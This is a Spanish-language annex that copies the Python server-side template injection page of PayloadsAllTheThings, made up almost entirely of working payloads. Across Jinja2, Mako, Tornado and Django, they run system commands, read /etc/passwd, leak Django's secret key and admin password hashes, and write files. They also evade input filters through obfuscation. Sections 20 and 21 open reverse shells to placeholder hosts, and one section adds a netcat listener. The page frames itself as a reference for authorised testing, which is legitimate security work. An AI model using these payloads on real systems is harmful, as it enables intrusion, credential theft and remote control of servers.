# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/Python.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - Python / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
{{ }}
${ }
```

## 2. Inyección en plantillas del servidor - Python / Universal Payloads

```python
__include__("os").popen("id").read() # Rendered RCE
getattr("", "x" + __include__("os").popen("id").read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE
```

## 3. Django / Django - Básicos Inyección

```python
{% csrf_token %} # Causes error with Jinja2
{{ 7*7 }}  # Error with Django Templates
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

## 4. Django / Django - Cross-Site Scripting

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

## 5. Django / Django - Debug Información Leak

```python
{% debug %}
```

## 6. Django / Django - Leaking App's Secret Key

```python
{{ messages.storages.0.signer.key }}
```

## 7. Django / Django - Admin Site URL leak

```python
{% include 'admin/base.html' %}
```

## 8. Django / Django - Admin Username And Password Hash Leak

```ps1
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

## 9. Jinja2 / Jinja2 - Básicos Inyección

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

## 10. Jinja2 / Jinja2 - Template Format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```

## 11. Jinja2 / Jinja2 - Debug Statement

```python
<pre>{% debug %}</pre>
```

### Variantes presentes en tablas o texto del apartado

```text
{% debug %}
```

## 12. Jinja2 / Jinja2 - Dump All Used Classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Variantes presentes en tablas o texto del apartado

```text
__globals__
__builtins__
```

## 13. Jinja2 / Jinja2 - Dump All Config Variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

## 14. Jinja2 / Jinja2 - Read Remote Archivo

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

## 15. Jinja2 / Jinja2 - Write Into Remote Archivo

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

## 16. Jinja2 / Jinja2 - Remote Ejecución de comandos

```bash
nc -lnvp 8000
```

## 17. Jinja2 - Remote Ejecución de comandos / Jinja2 - Forcing Output On Ciega RCE

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

## 18. Jinja2 - Remote Ejecución de comandos / Explotación The SSTI By Calling os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

```python
{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based
{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }} # Boolean-Based
```

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

### Variantes presentes en tablas o texto del apartado

```text
__builtins__
```

## 19. Jinja2 - Remote Ejecución de comandos / Explotación The SSTI By Calling subprocess.Popen

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

## 20. Jinja2 - Remote Ejecución de comandos / Explotación The SSTI By Calling Popen Sin Guessing The Offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

## 21. Jinja2 - Remote Ejecución de comandos / Explotación The SSTI By Writing An Evil Config Archivo

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

## 22. Jinja2 / Jinja2 - Remote Ejecución de comandos Con Obfuscation

```python
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```

### Variantes presentes en tablas o texto del apartado

```text
{{self.__init__.__globals__.__str__()[1786:1788]}}
```

## 23. Jinja2 / Jinja2 - Evasión de filtros

```python
request.__class__
request["__class__"]
```

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Variantes presentes en tablas o texto del apartado

```text
_
[
]
```

## 24. Tornado / Tornado - Básicos Inyección

```py
{{7*7}}
{{7*'7'}}
```

## 25. Tornado / Tornado - Remote Ejecución de comandos

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

## 26. Inyección en plantillas del servidor - Python / Mako

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

## 27. Mako / Mako - Remote Ejecución de comandos

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## 28. Mako / Mako - Remote Ejecución de comandos Con Obfuscation

```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

```python
<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

### Variantes presentes en tablas o texto del apartado

```text
${str().join(chr(i)for(i)in[105,100])}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
